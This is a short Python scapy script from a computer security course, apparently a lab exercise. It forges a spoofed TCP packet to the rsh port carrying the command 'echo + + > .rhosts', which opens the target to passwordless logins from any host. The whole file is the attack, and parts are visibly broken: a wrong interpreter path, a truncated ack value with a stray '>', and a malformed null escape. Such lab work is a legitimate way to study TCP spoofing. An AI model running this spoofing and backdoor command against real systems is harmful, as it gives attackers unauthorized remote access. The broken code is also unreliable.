#!/user/bin/python3

'''
	Name: Joshua Ludolf
	Class: CSCI 4321 - Computer Security
'''

from scapy.all import *

ip = IP(src = "10.9.0.6", dst = "10.9.0.5")

tcp = TCP(sport = 1023, dport = 514, flags = "A", seq = 778933536, ack = 269591>

if tcp.flags == "A":
        print("Establishing ACK packets")

data = "9090\x00seed\x00dees\x00echo + + > .rhostsx00"

pkt = ip/tcp/data

ls(pkt)

send(pkt, verbose = 0)


